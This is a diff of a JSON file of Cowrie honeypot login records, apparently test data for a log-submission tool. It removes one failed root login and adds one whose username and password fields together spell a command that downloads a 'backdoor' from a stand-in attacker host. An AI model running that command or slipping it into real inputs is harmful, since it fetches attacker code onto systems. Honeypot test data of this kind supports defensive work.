@@ -5,18 +5,6 @@
         "eventid": "cowrie.login.failed",
         "src_ip": "8.8.8.8",
         "username": "root",
-        "password": "password2",
-        "timestamp": "2026-03-29T14:41:16.009742",
-        "submitted_at": "2026-03-29T14:41:16.009759",
-        "source": "manual_submission"
-      },
-      "submitted_at": "2026-03-29T14:41:16.009759"
-    },
-    {
-      "log": {
-        "eventid": "cowrie.login.failed",
-        "src_ip": "8.8.8.8",
-        "username": "root",
         "password": "password3",
         "timestamp": "2026-03-29T14:41:17.413354",
         "submitted_at": "2026-03-29T14:41:17.413370",
@@ -599,6 +587,18 @@
         "source": "manual_submission"
       },
       "submitted_at": "2026-03-29T22:54:46.394461"
+    },
+    {
+      "log": {
+        "eventid": "cowrie.login.failed",
+        "src_ip": "198.51.100.5",
+        "username": "\"curl",
+        "password": "-O http://hacker.ru/backdoor\"",
+        "timestamp": "2026-03-29T22:54:48.136500",
+        "submitted_at": "2026-03-29T22:54:48.136516",
+        "source": "manual_submission"
+      },
+      "submitted_at": "2026-03-29T22:54:48.136516"
     }
   ]
 }
